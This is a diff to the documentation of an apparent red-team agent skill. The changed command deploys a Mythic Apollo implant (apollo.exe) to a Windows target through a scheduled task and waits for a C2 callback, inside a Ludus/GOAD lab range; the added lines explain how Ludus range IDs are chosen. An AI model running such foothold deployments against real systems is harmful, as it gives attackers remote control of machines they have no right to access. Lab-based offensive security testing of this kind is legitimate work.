@@ -67,8 +67,13 @@ the result to a generic reset error.
 For retained staged footholds, use the one-command interactive launcher with the uniqueness gate:
 
 ```bash
-skills/sage-mythic-payload-deploy/scripts/launch_apollo_foothold.sh <target-ip> '<DOMAIN\user>' -- --ludus-range-id <range-id> --target-host <host> --callback-host <host> --callback-user <user> --task-name SageApolloBootstrap --expected-task-state Ready --expected-remote-path 'C:\Users\Public\apollo.exe' --expected-remote-sha256 aea555ddff1b6f1941714fdffe7a760deb5058c20861965ab711c7aa19091b37 --callback-settle-seconds 90 --require-unique-callback
+skills/sage-mythic-payload-deploy/scripts/launch_apollo_foothold.sh <target-ip> '<DOMAIN\user>' -- --target-host <host> --callback-host <host> --callback-user <user> --task-name SageApolloBootstrap --expected-task-state Ready --expected-remote-path 'C:\Users\Public\apollo.exe' --expected-remote-sha256 aea555ddff1b6f1941714fdffe7a760deb5058c20861965ab711c7aa19091b37 --callback-settle-seconds 90 --require-unique-callback
 ```
+
+Omit `--ludus-range-id` to use the API key's default range, which is the GOAD range here. Ludus addresses a
+range by its ID (`GOADf255df`), never its number (`4`, the range's IP octet); `ludus.py status` prints the ID
+first. A bare number is resolved to its ID only when exactly one accessible range carries it, and refused
+otherwise, before any range request.
 
 The settle window is part of the evidence gate: if another matching callback appears during it, treat the attempt as
 non-countable and fix the foothold state before continuing.
